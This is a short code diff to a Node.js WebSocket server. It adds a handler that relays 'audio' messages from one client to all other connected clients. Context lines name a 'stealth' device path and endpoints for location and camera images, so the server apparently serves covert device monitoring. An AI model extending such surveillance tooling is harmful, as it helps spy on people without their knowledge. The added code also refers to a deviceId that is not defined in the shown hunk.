@@ -128,13 +128,28 @@ wss.on("connection", (ws, req) => {
     webClients.add(ws);
     console.log(`Web client connected. Total: ${webClients.size}`);
 
-    ws.on("message", (msg) => {
-      try {
-        // const parsed = JSON.parse(msg.toString());
-      } catch (e) {
-        // ignore non-json
-      }
-    });
+    // В обработчике WebSocket сообщений:
+ws.on('message', (message) => {
+    try {
+        const data = JSON.parse(message);
+        
+        if (data.type === 'audio') {
+            // Передаем всем подключенным клиентам
+            wss.clients.forEach(client => {
+                if (client !== ws && client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify({
+                        type: 'audio',
+                        deviceId: deviceId,
+                        data: data.data,
+                        timestamp: data.timestamp
+                    }));
+                }
+            });
+        }
+    } catch (e) {
+        console.error('Message parse error:', e);
+    }
+});
 
     ws.on("close", () => {
       webClients.delete(ws);
@@ -462,6 +477,7 @@ server.listen(PORT, () => {
   console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
   console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
 });
+
 
 
 
